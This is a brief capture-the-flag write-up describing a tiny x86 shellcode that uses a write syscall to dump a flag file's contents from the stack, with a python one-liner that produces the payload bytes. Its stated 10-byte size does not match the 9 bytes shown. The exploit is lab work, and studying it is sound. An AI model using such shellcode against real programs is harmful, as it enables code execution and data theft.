In this we had to provide a 10 shellcode to print the contents of the file. The program loaded the contents of the file on the stack and started
executing the shellcode. Since the size of the shellcode was limited the only thing we could do is make a call to a function, but even that would
be more than 10 bytes hence we did a system call to write which had a code of 10 bytes exactly. 

The shellcode that we used:-
mov eax,4
mov ecx,esi
int 0x80

The corresponding python code for txt generation:-
python -c 'print ("\xb8\x04\x00\x00\x00\x89\xf1\xcd\x80")' > input
